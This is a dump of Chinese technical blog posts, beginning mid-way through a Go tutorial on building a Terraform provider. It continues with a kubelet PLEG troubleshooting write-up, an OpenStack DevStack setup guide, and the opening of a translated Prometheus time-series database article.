schema.TypeString, Optional: true, DefaultFunc: schema.EnvDefaultFunc(\"QVM_SK\", \"\"), Description: descriptions[\"sk\"], }, }, ResourcesMap: map[string]*schema.Resource{ \"compute_instance\": resourceComputeInstance(), }, ConfigureFunc: configureProvider, }} Schema 声明了 provider 配置文件的定义，对应的 tf 文件这样写： 12345provider qvm { url = &quot;https://qvm.qiniuapi.com&quot; ak = &quot;your app key&quot; sk = &quot;your app secret&quot;} 如果不在 tf 文件里指定 ak 和 sk，则 terraform 会根据 DefaultFunc，从环境变量 QVM_AK 和 QVM_SK 中获取。Optional 代表字段是可选的，即使用户没有填也不会报错。 ResourcesMap 声明了 provider 支持的资源和对应资源的工厂函数，例如这里我们只实现了计算资源，工厂函数的定义我们稍后再解释。 定义 Resource Schema上面提到的 resourceComputeInstance 负责创建一个 compute instance resource，对于计算资源我们可以这样定义： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465func resourceComputeInstance() *schema.Resource { return &amp;schema.Resource{ Create: resourceComputeInstanceCreate, Read: resourceComputeInstanceRead, Update: resourceComputeInstanceUpdate, Delete: resourceComputeInstanceDelete, Timeouts: &amp;schema.ResourceTimeout{ Create: schema.DefaultTimeout(30 * time.Minute), Update: schema.DefaultTimeout(30 * time.Minute), Delete: schema.DefaultTimeout(30 * time.Minute), }, Schema: map[string]*schema.Schema{ \"image_id\": { Type: schema.TypeString, Optional: true, ForceNew: true, }, \"instance_name\": { Type: schema.TypeString, Optional: true, }, \"system_disk\": { Type: schema.TypeList, Required: true, MaxItems: 1, Elem: &amp;schema.Resource{ Schema: map[string]*schema.Schema{ \"category\": { Type: schema.TypeString, Optional: true, Default: enums.DiskCategoryCloudEfficiency, ForceNew: true, }, \"size\": { Type: schema.TypeInt, Optional: true, Default: 40, }, }, }, }, \"data_disk\": { Type: schema.TypeList, Optional: true, MinItems: 1, MaxItems: 15, Elem: &amp;schema.Resource{ Schema: map[string]*schema.Schema{ \"category\": { Type: schema.TypeString, Optional: true, Default: enums.DiskCategoryCloudEfficiency, ForceNew: true, }, \"size\": { Type: schema.TypeInt, Optional: true, Default: 40, }, }, }, }, }, }} Create Read Update Delete 分别是管理资源的回调函数，terraform 框架会在合适的时间调用这几个函数，Timeouts 定义了每个操作的超时时间，Schema 与上面一样，是定义 tf 文件的具体结构。 ForceNew 代表一旦这个字段改变，则 terraform 会删除并重新创建该资源。TypeList 定义了一个列表，如果 MaxItems: 1 时，列表退化为单个资源。 为了简化起见，Schema 我们省略了很多字段，对应的 tf 文件可以这样写： 12345678910resource &quot;compute_instance&quot; &quot;test&quot; { count = &quot;${var.count}&quot; provider = &quot;qvm&quot; image_id = &quot;${var.image}&quot; instance_name = &quot;${var.instance_name}-${count.index}&quot; system_disk { category = &quot;efficiency&quot; size = 40 }} 其中 ${var.} 代表在 varaibles.tf 文件里定义的变量，具体可以用法可以参考 terraform 官方文档，这里不过多地介绍。 定义 Resource Operation FunctionCreate12345678910111213141516171819202122232425262728293031func resourceComputeInstanceCreate(d *schema.ResourceData, meta interface{}) error { config := meta.(*Config) client, err := config.computeClient() if err != nil { return err } systemDisk := d.Get(\"system_disk\").([]interface{})[0].(map[string]interface{}) systemDiskParameters := params.CreateInstanceSystemDiskParameters{ Category: enums.DiskCategory(systemDisk[\"category\"].(string)), Size: systemDisk[\"size\"].(int), } parameters := &amp;params.CreateInstanceParameters{ ImageId: d.Get(\"image_id\").(string), SystemDisk: systemDiskParameters, InstanceName: enums.InstanceName(d.Get(\"instance_name\").(string)), } log.Printf(\"[DEBUG] CreateInstanceParameters: %#v\", parameters) rsp, err := client.CreateInstance(parameters) if err != nil { log.Printf(\"[ERROR] create instance error, %v\", err) return err } log.Printf(\"[INFO] Instance ID: %s\", rsp.Data.InstanceId) d.SetId(rsp.Data.InstanceId) return resourceComputeInstanceRead(d, meta)} Create 的实现最重要的一个操作是 SetId，如果服务端资源创建成功，会返回一个 InstanceId，SetId 会将这个 InstanceId 保存，作为以后判断资源是否更新的 key。 return 前又进行了一次 Read 操作，是为了防止有些状态字段没有通过 CreateResponse 返回，再尝试通过一次 Read 来获取这些状态信息。 Delete123456789101112131415161718func resourceComputeInstanceDelete(d *schema.ResourceData, meta interface{}) error { config := meta.(*Config) client, err := config.computeClient() if err != nil { return err } p := &amp;params.DeleteInstanceParameters{ InstanceId: d.Id(), } _, err = client.DeleteInstance(p) if err != nil { return err } return nil} Update123func resourceComputeInstanceUpdate(d *schema.ResourceData, meta interface{}) error { return resourceComputeInstanceRead(d, meta)} 我们暂时不实现 Update 操作，因此这里只是简单地返回 Read。 Read1234567891011121314151617181920212223func resourceComputeInstanceRead(d *schema.ResourceData, meta interface{}) error { config := meta.(*Config) client, err := config.computeClient() if err != nil { return err } p := &amp;params.DescribeInstanceParameters{ InstanceId: d.Id(), } rsp, err := client.GetInstance(p) if err != nil { return err } instance := &amp;rsp.Data d.Set(\"image_id\", instance.ImageId) d.Set(\"instance_name\", instance.InstanceName) // ... return nil} Read 通过 InstanceId 对资源状态进行查询，保存至 resource data。 编译和构建上面基本代码框架实现后，我们就可以对 plugin 进行编译和构建了： 1go build -o terraform-provider-qvm 二进制文件的命名必须遵守以下命名规则： 1terraform-provider-&lt;NAME&gt; 构建后，我们手动将二进制拷贝至 terraform 默认的插件目录：${HOME}/.terraform/plguins。 使用进入工作目录，即 tf 文件保存的目录，假设这个目录的结构为： 12345terraform/qvm├── provider.tf├── resources.tf├── variables.tf└── terraform.tfvars 初始化1terraform init 修改配置可以通过 export 或创建 .tfvars 文件，对配置进行修改： 12export QVM_AK=export QVM_SK= 创建 terraform.tfvars 文件： 123instance_name = &quot;&quot;count = 1image = &quot;&quot; 查看更改1terraform plan 执行后 terraform 会对配置进行合法性校验。 应用更改1terraform apply 或者指定 .tfvars 文件： 1terraform apply -var-file=&quot;terraform.tfvars&quot; 销毁1terraform destroy 或者指定 .tfvars 文件： 1terraform destroy -var-file=&quot;terraform.tfvars&quot; 参考https://www.terraform.io/docs/extend/writing-custom-providers.html https://www.terraform.io/docs/extend/how-terraform-works.html","link":"/hexo-blog/20190522/从零开始实现一个-terraform-plugin/"},{"title":"PLEG unhealthy 导致节点状态不断在 Ready/NotReady 之间切换问题","text":"现象 收到告警提示 PLEG 延时升高（240s） 节点状态在 Ready 和 NotReady 之间频繁切换 有 pod 处于 Terminating 状态 排查和原因分析查看 kubelet PLEG 相关日志，发现大量 PLEG 超时日志： 1234567Nov 27 10:10:07 xq68 kubelet[24562]: E1127 10:10:07.444787 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:14:08 xq68 kubelet[24562]: E1127 10:14:08.502149 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:18:09 xq68 kubelet[24562]: E1127 10:18:09.555935 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:22:10 xq68 kubelet[24562]: E1127 10:22:10.838479 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:26:11 xq68 kubelet[24562]: E1127 10:26:11.878116 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:30:12 xq68 kubelet[24562]: E1127 10:30:12.928984 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:34:13 xq68 kubelet[24562]: E1127 10:34:13.993793 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded PLEG (Pod Lifecycle Event Generator) 是 kubelet 定期检查节点上每个 pod 状态的逻辑，它内部缓存了节点所有 pod 的状态，每次通过 relist 时从 container runtime (dockerd) 获取 pod (也就是 pod 包含的所有 container) 的最新状态，然后和当前缓存比较，产生 PodLifecycleEvent。然后遍历所有的 events，更新 pod 状态缓存后将该 event 发送至 event channel。部分代码如下： 而问题就出在更新 Pod 缓存的逻辑，首先 PLEG 更新缓存是串行的，也就是前一个 Pod 执行成功了，后一个 Pod 才能开始；其次，更新缓存会调用 container runtime 的 GetPodStatus 接口来获取 Pod 状态（通过 rpc 获取容器状态和 Pod IP）；而 rpc 调用是阻塞的，默认 120s (2min) 超时；PLEG 只要发现两次 relist 间隔超过 3min，就会认为 PLEG unhealthy，将节点设为 NotReady。 上面的 GetPodStatus 中有调用 cri 的 rpc 接口 PodSandboxStatus 和 ListContainers/ContainerStatus 分别获取 pause 容器和其他容器的状态。 其中 ListContainers/ContainerStatus 里只会从 docker daemon 获取容器信息，而 PodSandboxStatus 不仅会从 docker daemon 获取 pause 容器信息，还会从 CNI 通过 GetPodNetworkStatus 接口获取 pod ip。这几个请求都是 grpc 请求，且超时时间都是 2min，如果中间因为各种原因 hang 住，会阻塞 2min 才能超时返回。 简单整理了整个调用逻辑如下： 1234 grpc http grpckubelet &lt;----&gt; cri &lt;----&gt; dockerd &lt;----&gt; containerd &lt;----&gt; cni &lt;----&gt; network plugin grpc command 同时由上面代码分析，PLEG 超时的原因，就是在更新某个 Pod 状态时，kubelet 通过 rpc 调用 docker daemon 或者 network plugin 时超时了。 调用 docker daemon 超时的原因有： docker daemon hang 住。 调用 network plugin 超时的原因有： network plugin 是利用 command exec 方式调用的， 因为各种原因进程不退出，会导致调用 hang 住。 调用 network plugin 还有个细节，就是每次调用前会按照 pod 加锁，所以只要一次调用 hang 住，后面的调用都会 hang 住，等待锁释放。 但是为什么对一个 Pod 调用 GetPodStatus 时 grpc 超时会导致 PLEG unhealthy 呢？我们先看看两个逻辑： 一是 relist 时的 updateCache 逻辑： PLEG 每次 relist 时不仅要对当前状态有更新的 Pod 进行一次状态获取，还要对上次获取失败的 Pod 重新执行一次状态获取。也就是说，如果一个 grpc 请求的超时是 2min，那么假设一个 Pod 有问题，会将单次 relist 耗时放大至 4min。 二是 PLEG healthy check 逻辑： Runtime Health Checker 会定时调用 PLEG 的 Healty 函数对 PLEG 执行状态进行检测，从而判断节点的健康状况。每次检测时，只要判断距离上次执行完 relist 的时间大于 3 分钟，上层逻辑就会认为节点不健康了，便会根据结果将节点设置为 NotReady。 现在的场景是 PLEG relist 会执行，但是每次执行对于有问题的 Pod 要执行两次 updateCache/GetPodStatus，也就是等两次超时需要 4min 时间。Runtime Healthy Checker 每隔 100ms ~ 5s 执行一次，因此在 4min 内，前 3min 的 health check 是成功的，成功之后会将节点标记为 Ready，而 3min 后的 1min 内 healthy check 会失败，kubelet 又会将节点标记为 NotReady。 这个也能从监控图像上得到证实，如下图，ready status == 1 的间隔是 3min，ready status == 0 的间隔是 1min。 接下来我们一步步确认是哪个组件出了问题导致的： 确认 docker daemon 状态，看状态获取接口是否正常： 1curl --unix-socket /var/run/docker.sock http:/containers/40cddec6426e280b8e42a07ca5c8711d18557f3163c2541efd39462ccba10e39/json 结果正常返回。 再查看网络组件进程状态，发现 nuke 和 nuke-ipam 两个进程从 2018-11-23 启动后一直没有退出（今天是 2018-11-27）。正常情况下，nuke 和 nkue-ipam 只在 kubelet 通过 cni 调用时执行，执行成功后会立即退出，而现在没有退出是个异常。因此判断问题可能出在 nuke 组件上。 1234567root@xq68:~# ps aux | grep nukeroot 21122 3.3 0.0 40064 38164 ? Ssl Nov19 390:35 /nuke/nukedaemonroot 22814 0.0 0.0 116436 8528 ? Sl Nov23 0:00 /opt/cni/bin/nukeroot 22831 0.0 0.0 115204 8192 ? Sl Nov23 0:00 /opt/cni/bin/nuke-ipamroot 24012 0.0 0.0 14224 1032 pts/32 S+ 10:24 0:00 grep --color=auto nukeroot 29315 0.0 0.0 1560 960 ? Ss Jul27 0:00 sh /app/install-nuke-cni.shroot 31448 0.0 0.0 28280 23696 ? Ssl Nov01 28:36 /bin/nuke-l3-agent 之前出现同样的问题时，为方便排查，我保存了 nuke 相关的 stack 信息，具体原因还需要网络组协助排查。 另外，如果网络方案为 calico，calico 进程 Z 住也会导致该问题： 解决解决方式有：（选一种即可） 删除问题容器（一般都是 pause 容器） 12docker ps -a | grep apiserver-inspection-workers-ds-1542964416453270535-6vhmtdocker rm -f &lt;container_id&gt; 删除后 kubelet 已经找不到这个容器，会认为 sandbox 已经 stop 成功，就不会再继续执行 PodSandBoxStatus 调用 cri 和 cni，从而就不会触发有问题的逻辑了。 重启 kubelet（待验证） 对于 neutron 网络方案，手动 kill 掉 hang 住的 nuke 和 nuke-ipam，network plugin 强行返回错误，kubelet 会继续执行后续逻辑。 改进优化 kubelet PLEG 逻辑 考虑并行执行，一个 Pod 有问题时不影响整个 PLEG relist 耗时； 缩小 rpc 超时时间（目前 2min），对于正常场景来说，调用 cri 和 cni 都用不了这么长的时间。缩小超时可以减小单个 Pod 超时对 PLEG 整体的影响； 优化 updateCache 逻辑，保证每次 relist 对同一个 Pod 只进行一次状态获取。 修复 network plugin寻找 network plugin hang 住的原因并修复。 优化监控告警 pleg latency &gt; 240s for 15min -&gt; error 短信、slack 告知 pleg latency &gt; 240s -&gt; warning slack 告知 相关问题https://github.com/kubernetes/kubernetes/issues/45419","link":"/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/"},{"title":"使用 Devstack 搭建 Openstack 集群","text":"环境搭建多节点搭建步骤： https://docs.openstack.org/devstack/rocky/guides/multinode-lab.html 要配置 kvm，否则使用默认的 qemu 跑 vm 性能会很差： https://docs.openstack.org/devstack/rocky/guides/devstack-with-nested-kvm.html control 节点配置: 1234567891011121314[[local|localrc]]HOST_IP=10.20.102.37FLAT_INTERFACE=bond0FIXED_RANGE=10.4.128.0/20FIXED_NETWORK_SIZE=4096FLOATING_RANGE=10.20.102.223/27MULTI_HOST=1LOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=LIBVIRT_TYPE=kvmIP_VERSION=4 compute 节点配置: 123456789101112131415161718192021222324[[local|localrc]]HOST_IP=10.20.102.38 # change this per compute nodeFLAT_INTERFACE=bond0FIXED_RANGE=10.4.128.0/20FIXED_NETWORK_SIZE=4096FLOATING_RANGE=10.20.102.223/27MULTI_HOST=1LOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=DATABASE_TYPE=mysqlSERVICE_HOST=10.20.102.37MYSQL_HOST=$SERVICE_HOSTRABBIT_HOST=$SERVICE_HOSTGLANCE_HOSTPORT=$SERVICE_HOST:9292ENABLED_SERVICES=n-cpu,q-agt,n-api-meta,c-vol,placement-clientNOVA_VNC_ENABLED=TrueNOVNCPROXY_URL=\"http://$SERVICE_HOST:6080/vnc_auto.html\"VNCSERVER_LISTEN=$HOST_IPVNCSERVER_PROXYCLIENT_ADDRESS=$VNCSERVER_LISTENLIBVIRT_TYPE=kvmIP_VERSION=4 FIXED_RANGE 是 vm 实例的内网地址，供 vm 之间访问，vm 创建时便会分配一个，创建后一般不能更改。 FLOATING_RANGE 是 vm 实例的外网地址，供物理机访问 vm，以及 vm 访问物理机，可以在实例创建后进行绑定和解绑。这个网段一般设置为物理机 IP 的子网段。 如果需要 ipv6，则需要修改以下参数： 12345net.ipv6.conf.all.disable_ipv6=0net.ipv6.conf.default.disable_ipv6=0net.ipv6.conf.lo.disable_ipv6=0sysctl -p 不要按照 devstack 官方文档创建 local.sh。因为 openstack rocky 已经默认使用 neutron 了，这个脚本对 neutron 没有什么作用。https://bugs.launchpad.net/devstack/+bug/1783576 1for i in `seq 2 10`; do /opt/stack/nova/bin/nova-manage fixed reserve 10.4.128.$i; done 多节点如果出现调度错误，需要执行： 1./tools/discover_hosts.sh 或者： 1nova-manage cell_v2 discover_hosts --verbose 如果如果遇到一些未知的问题，尝试拆除环境，清除所有资源后重试： 123./unstack.sh./clean.sh./stack.sh 镜像创建1openstack image create --public --disk-format qcow2 --container-format bare --file xenial-server-cloudimg-amd64-disk1.img ubuntu-xenial-server-amd64 实例创建首先进行 admin 认证鉴权： 123sudo su - stackcd /opt/stack/devstacksource openrc 创建安全组规则，允许 ping 和 ssh： 12openstack security group rule create --proto icmp defaultopenstack security group rule create --proto tcp --dst-port 22 default 创建测试实例： 1234openstack server create --flavor m1.tiny \\--image $(openstack image list | grep cirros | cut -f3 -d '|') \\--nic net-id=$(openstack network list | grep private | cut -f2 -d '|' | tr -d ' ') \\--security-group default vm 创建 floating IP： 1openstack floating ip create public 将 floating IP 与实例绑定： 1openstack server add floating ip vm 10.20.102.238 就可以通过 floating IP 登录 vm 实例了，用户名密码是： 12cirroscubswin:) vm 如果需要上外网，需要配置 nat。在物理机上执行： 1234#ifconfig br-ex 10.20.102.223/27iptables -t nat -I POSTROUTING -s 10.20.102.223/27 -j MASQUERADEiptables -I FORWARD -s 10.20.102.223/27 -j ACCEPTiptables -I FORWARD -d 10.20.102.223/27 -j ACCEPT 配置卷类型创建 pv 和 vg： 12pvcreate /dev/sdb1vgcreate stack-volumes-hdd /dev/sdb1 配置 cinder： 1vim /etc/cinder/cinder.conf 123456789101112[DEFAULT]default_volume_type = hddenabled_backends = hdd,ssd[hdd]image_volume_cache_enabled = Truevolume_clear = zerolvm_type = autotarget_helper = tgtadmvolume_group = stack-volumes-hddvolume_driver = cinder.volume.drivers.lvm.LVMVolumeDrivervolume_backend_name = hdd 重启 openstack： 1systemctl restart devstack@* 创建卷类型： 12openstack volume type create hddopenstack volume type set hdd --property volume_backend_name=hdd 常见问题volume 无法创建 排查 1sudo journalctl -f --unit devstack@c-vol 1Mar 06 14:59:18 kirk-system cinder-volume[27813]: ERROR oslo_service.service [None req-e1391562-6252-4b98-ba3a-6420edbafffe None None] Error starting thread.: DetachedInstanceError: Parent instance &lt;VolumeAttachment at 0x7f6455ffee90&gt; is not bound to a Session; lazy load operation of attribute &apos;volume&apos; cannot proceed (Background on this error at: http://sqlalche.me/e/bhk3) 解决 https://ask.openstack.org/en/question/103315/cinder-volume-attached-to-a-terminated-server-now-i-cant-delete-it/ ubuntu 18.04 切换到 /etc/network/interfacehttps://askubuntu.com/questions/1031709/ubuntu-18-04-switch-back-to-etc-network-interfaces 参考文档 golang SDK：http://gophercloud.io/docs/compute/#servers terraform：https://www.terraform.io/docs/providers/openstack/ 获取 Openstack 镜像：https://docs.openstack.org/image-guide/obtain-images.html 使用 systemd 管理 devstack：https://docs.openstack.org/devstack/rocky/systemd.html devstack networking： https://docs.openstack.org/devstack/rocky/networking.html https://wiki.openstack.org/wiki/OpsGuide-Network-Troubleshooting neutron 相关： https://docs.openstack.org/devstack/rocky/guides/neutron.html https://www.ibm.com/developerworks/cn/cloud/library/1402_chenhy_openstacknetwork/ 附neutron+vlan 模式配置： 123456789101112131415161718192021222324252627[[local|localrc]]HOST_IP=10.20.102.37PUBLIC_INTERFACE=bond1LOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=LIBVIRT_TYPE=kvm## Neutron optionsIP_VERSION=4Q_USE_SECGROUP=TrueENABLE_TENANT_VLANS=TrueTENANT_VLAN_RANGE=3001:4000PHYSICAL_NETWORK=defaultOVS_PHYSICAL_BRIDGE=br-exQ_USE_PROVIDER_NETWORKING=Truedisable_service q-l3## Neutron Networking options used to create Neutron SubnetsIPV4_ADDRS_SAFE_TO_USE=\"203.0.113.0/24\"NETWORK_GATEWAY=203.0.113.1PROVIDER_SUBNET_NAME=\"provider_net\"PROVIDER_NETWORK_TYPE=\"vlan\"SEGMENTATION_ID=2010USE_SUBNETPOOL=False 12345678910111213141516171819202122232425262728[[local|localrc]]HOST_IP=10.20.102.38 # change this per compute nodeLOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=DATABASE_TYPE=mysqlSERVICE_HOST=10.20.102.37MYSQL_HOST=$SERVICE_HOSTRABBIT_HOST=$SERVICE_HOSTGLANCE_HOSTPORT=$SERVICE_HOST:9292ENABLED_SERVICES=n-cpu,q-agt,n-api-meta,c-vol,placement-clientNOVA_VNC_ENABLED=TrueNOVNCPROXY_URL=\"http://$SERVICE_HOST:6080/vnc_auto.html\"VNCSERVER_LISTEN=$HOST_IPVNCSERVER_PROXYCLIENT_ADDRESS=$VNCSERVER_LISTENLIBVIRT_TYPE=kvm# Services that a compute node runsENABLED_SERVICES=n-cpu,rabbit,q-agt## Open vSwitch provider networking optionsIP_VERSION=4PHYSICAL_NETWORK=defaultOVS_PHYSICAL_BRIDGE=br-exPUBLIC_INTERFACE=bond1Q_USE_PROVIDER_NETWORKING=True","link":"/hexo-blog/20190107/使用-Devstack-搭建-Openstack-集群/"},{"title":"从头编写一款时间序列数据库","text":"本文转自 从头编写一款时间序列数据库 （翻译：Colstuwjx），请支持原作者。 我从事监控方面的工作。尤其是专注在 Prometheus，一款内置了自己定制的时间序列数据库的监控系统，以及它和 Kubernetes 的集成工作。 从很多方面来说，Kubernetes 表现出了一切 Prometheus 专门设计的东西。它使得持续部署，自动扩缩，以及高度动态环境的其他功能更易于实现。它的查询语言和操作模型，还有许多其他概念方面的决策使得 Prometheus 尤其适合这样的环境。然而，如果被监控的工作负载变得更加显著动态的话，这也会给监控系统本身带来新的压力。基于这一点的考虑，与其再次回顾 Prometheus 已经很好解决的问题，还不如专注于在这样一个高度动态或短生命周期服务的环境里提高它的性能。 Prometheus 的存储层在历史上有着惊人的性能表现，一个单台服务器每秒可以摄取多达 100 万个采样，数百万个时间序列，同时仅占用令人惊叹的少量磁盘空间。尽管当前的存储已经给我们提供了不错的服务，笔者构思了一个新设计的存储子系统用来纠正现有解决方案的一些短板，并且可以用来配备支撑下一代的集群规模。 注意：笔者并没有数据库方面的背景。我在这里所说的话可能是错误的或是带有误导性的。你可以在 Freenode 上的 #prometheus 频道里将你的批评指正反馈到我（fabxc）。 问题，难题，问题域首先，快速概括一下我们试图完成的任务以及这里面暴露出的关键问题。针对每一点，我们会先看一看 Prometheus 目前的做法，它在哪些地方做的出色，以及我们旨在通过新的设计想解决哪些问题。 时间序列数据我们有一个根据时间采集数据点的系统。 1identifier -&gt; (t0, v0), (t1, v1), (t2, v2), (t3, v3), .... 每个数据点都是一个由时间戳和值组成的元组。为了达成监控的目的，时间戳是一个整数，值则可以是任意数字。经验来看，一个64位的浮点数往往能够很好地展现计数器（counter）和测量（gauge）的值，因此我们也不例外。一个时间序列是一组时间上严格单调递增的数据点序列，它可以通过一个标识符来寻址。我们的标识符便是一个度量（metric）名带上一个多维标签的字典。多维标签会将单个度量的测量空间分区。每个度量名加上一串唯一的标签便组成了它自己的时间序列（time series），它会有一个与之关联的值序列流。下面是一组典型的序列标识符，它是度量请求计数的一部分： 123requests_total{path=&quot;/status&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.1:80&quot;}requests_total{path=&quot;/status&quot;, method=&quot;POST&quot;, instance=&quot;10.0.0.3:80&quot;}requests_total{path=&quot;/&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.2:80&quot;} 让我们快速简化一下这个表达形式：我们不妨将一个度量名视为另一种标签维度 - 在我们的场景里便是 __name__。在查询级别上，它可能会被特殊对待，但是它并不会关注我们采用何种方式来存放它，这一点我们将在后面看到。 123{__name__=&quot;requests_total&quot;, path=&quot;/status&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.1:80&quot;}{__name__=&quot;requests_total&quot;, path=&quot;/status&quot;, method=&quot;POST&quot;, instance=&quot;10.0.0.3:80&quot;}{__name__=&quot;requests_total&quot;, path=&quot;/&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.2:80&quot;} 当查询时间序列数据时，我们想通过指定标签来选择。最简单的例子莫过于 {__name__=&quot;requests_total&quot;} 会选出所有属于 requests_total 度量的序列。针对所有被选中的序列来说，我们会在一个指定的时间窗口里检索出对应的数据点。 而在更复杂的查询里，我们可能希望同时选择满足多个标签选择器的序列，并且就表达形式来说也会存在比等于更复杂的条件。比如，取反（method!=&quot;GET&quot;）或者正则表达式匹配（method=~&quot;PUT|POST&quot;）。 这大体上决定了所需存储的数据以及它们该如何被调用。 横轴和纵轴在一个简化的视图中，所有数据点都可以在一个二维平面上分布。横轴代表时间，而序列标识符的空间遍及整个纵轴。 1234567891011121314series ^ │ . . . . . . . . . . . . . . . . . . . . . . {__name__=&quot;request_total&quot;, method=&quot;GET&quot;} │ . . . . . . . . . . . . . . . . . . . . . . {__name__=&quot;request_total&quot;, method=&quot;POST&quot;} │ . . . . . . . │ . . . . . . . . . . . . . . . . . . . ... │ . . . . . . . . . . . . . . . . . . . . . │ . . . . . . . . . . . . . . . . . . . . . {__name__=&quot;errors_total&quot;, method=&quot;POST&quot;} │ . . . . . . . . . . . . . . . . . {__name__=&quot;errors_total&quot;, method=&quot;GET&quot;} │ . . . . . . . . . . . . . . │ . . . . . . . . . . . . . . . . . . . ... │ . . . . . . . . . . . . . . . . . . . . v &lt;-------------------- time ---------------------&gt; Prometheus 通过定期抓取一组时间序列的当前值来检索得到数据点。这样一个我们检索批次的实体被称作一个目标（target）。由于每个目标的样本数据都是单独抓取的，因此写入模式是完全垂直并且高度并发的。这里提供一些衡量尺度：一个单个的Prometheus实例会从成千上万的目标采集数据点，每个目标可以暴露出数百上千个不同的时间序列。 就每秒采集数百万个数据点的规模而言，批量写入是一个不可调和的性能需求。分散地写入单个数据点到磁盘的话又会是一个非常缓慢的过程。因此，我们想要实现的是按顺序写入更大的数据块。对于机械的旋转磁盘而言这样做并不出奇，因为它们的头会一直物理地移动到不同的区块。虽然 SSD 以快速地随机写入性能而闻名，但是实际上它们却不能修改单个字节，而只能写入 4KiB 或更大的的页。这意味着写一个 16 字节的样本同写一个完整的 4KiB 页没什么两样。这种行为即是所谓的写入放大的一部分，作为一个“额外红利”，它会耗损你的 SSD —— 因此它不仅仅只是会变慢而已，还会在几天或者几周内完全毁掉你的硬件。关于这个问题的更详细信息，系列博客”针对 SSD 编程“系列会是一个不错的资源。我们不妨考虑一下这里面的主要关键点：顺序和批量写入是旋转磁盘和 SSD 的理想写入模式。 这是一个应该遵循的简单规则。 时间序列数据库的查询模型跟写模型相比，更是有明显不同的区别。我们可以对一个单个序列查询一个单个的数据点，在 10000 个序列里查询一个单个的数据点，在一个单个序列里查询几周的数据点，甚至在 10000 个序列里查询几周的数据点，等等。因此在我们的二维平面上，查询既不是完全垂直的，也不是水平的，而是二者的矩形组合。记录规则可以减轻已知的一些查询方面的问题，但是仍然不是临时查询（ad-hoc queries）的一个通用解决方案，这些查询也必须能很好的进行下去。 须知我们想要的是批量写入，但是我们得到的批次只是序列之间一个纵向的数据点集合。当在一个时间窗口上针对某个序列查询数据点时，不仅难以确定各个数据点可以被找到的位置，我们还不得不从磁盘上大量的随机位置进行读取。每次查询操作可能涉及到数以百万的样例数据，即使在最快的 SSD 上这样的操作也会变慢。读操作还将从磁盘上检索更多的数据，而不仅仅只是所请求的 16 字节大小的样本。 SSD 将加载一整页，HDD 将至少读取整个扇区。 无论哪种方式，我们都会浪费宝贵的读吞吐量。 因此，在理想情况下，相同序列的样本数据将会被顺序存储，这样一来我们便可以用尽可能少的读来扫描得到它们。 在上层，我们只需要知道这个序列可以访问的所有数据点的开始位置。 在将收集的数据写入磁盘的理想模式和为服务的查询操作提供更显著有效的存储格式之间显然存在着强烈的冲突。这是我们的时间序列数据库要解决的根本问题。 当前的解决方案是时候来看看 Prometheus 当前的存储是如何实现的，我们不妨叫它“V2”，它致力于解决这个问题。我们会为每个时间序列创建一个文件，它会按照时间顺序包含所有的样本数据。由于每隔几秒就把单个的样本数据添加到所有这些文件的成本不小，我们针对每个序列在内存里批量存放了 1KiB 的数据块，一旦它们填满了再把这些块添加到一个个的文件里。这一方案解决了很大一部分问题。写操作如今是分批次的，样本数据也是顺序存储的。它还能为我们提供一个令人难以置信的高效压缩格式，这是基于一个给定的样本相对于相同序列里前面的那些样本数据只有非常少量的变化这一属性而设计。Facebook 在它们的 Gorilla TSDB 的论文里描述了一种类似的基于块（Chunk）的存储方法，并且引入了一个压缩格式，将16个字节的样本减少到平均 1.37 字节。V2 存储使用了各种压缩格式，包括 Gorilla 的一个变种。 12345678 ┌──────────┬─────────┬─────────┬─────────┬─────────┐ series A └──────────┴─────────┴─────────┴─────────┴─────────┘ ┌──────────┬─────────┬─────────┬─────────┬─────────┐ series B └──────────┴─────────┴─────────┴─────────┴─────────┘ . . .┌──────────┬─────────┬─────────┬─────────┬─────────┬─────────┐ series XYZ└──────────┴─────────┴─────────┴─────────┴─────────┴─────────┘ chunk 1 chunk 2 chunk 3 ... 尽管基于块的实现方案很棒，如何为每个序列维护一个单独的文件却也是V2存储引擎困扰的地方，这里面有几个原因： 我们实际上需要维护的文件数量多于我们正在收集数据的时间序列数量。在“序列分流”一节会详解介绍到这点。由于产生了几百万个文件，不久的将来或者迟早有一天，我们的文件系统会出现 inodes 耗尽的情况。在这种情况下我们只能通过重新格式化磁盘来恢复，这样做可能带有侵入性和破坏性。通常我们都希望避免格式化磁盘，特别是需要适配某个单个应用时更是如此。 